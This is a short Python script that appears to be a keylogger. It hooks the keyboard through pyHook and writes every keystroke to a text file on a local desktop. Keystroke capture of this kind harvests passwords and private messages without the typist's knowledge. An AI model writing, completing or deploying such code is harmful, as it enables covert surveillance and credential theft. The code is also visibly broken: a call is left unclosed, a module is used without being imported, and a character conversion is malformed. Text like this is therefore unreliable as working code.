import sys
import logging
import pyHook

file = '/Users/Armin/Desktop/output.txt'

def TypingKeys(event):
    logging.basicConfig(filename=file, format='%(loggedword)s'
    chr(event.Ascii)
    logging.log(50, chr(event, Ascii))
    return True
    
manager = pyHook.HookManager()
manager.KeyDown = TypingKeys
manager.HookKeyboard()
pythoncom.PumpMessages()
